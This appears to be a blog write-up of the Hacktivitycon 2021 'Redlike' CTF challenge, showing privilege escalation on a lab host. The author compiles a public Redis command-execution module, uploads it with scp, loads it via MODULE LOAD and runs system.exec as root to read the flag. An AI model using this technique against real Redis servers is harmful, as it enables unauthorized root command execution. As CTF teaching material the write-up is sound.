+++
title = "Redlike (Redis PrivEsc) Hacktivitycon 2021 Writeup [Alternate Approach]"
date = "2021-09-19T20:59:21+05:30"
author = ""
authorTwitter = "" #do not include @
cover = "https://miro.medium.com/max/788/0*wj44yAjifjt6VlCP.png"
tags = ["ctf", "hacktivitycon", "hackerone", "redis", "root"]
showFullContent = false

+++

After I read write-ups by other hackers of this challenge, I found out that most of them solved it with adding SSH keys, and I did it by installing redis module, so here is my approach.

As we start the challenge we get ssh login to start with, in privilege escalation just like everyone else I started with [linpeas.sh](https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh) after analyzing the results of linpeas I realised soon there is nothing much in this box other than redis.

{{< image src="/images/redlike/2021-09-19_21-14_1.png" position="center" style="border-radius: 5px;" >}}

So I started with checking `redis-server` and `redis-cli` versions.

{{< image src="/images/redlike/2021-09-19_21-14.png" position="center" style="border-radius: 5px;" >}}

Then after some research I came across this redis module.

```url
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
```

I clone and compiled the module in my VPS and uploaded it to the host.

```bash
git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git
cd RedisModules-ExecuteCommand
make
scp -P 30341 module.so user@challenge.ctf.games:/tmp/
```

Then I loaded the module and I was able to executed the command as `root` and read the flag.

```bash
redis-cli
MODULE LOAD /tmp/module.so
system.exec "id"
system.exec "ls /root/"
system.exec "cat /root/flag.txt"
```

 {{< image src="/images/redlike/2021-09-19_21-38.png" position="center" style="border-radius: 5px;" >}}
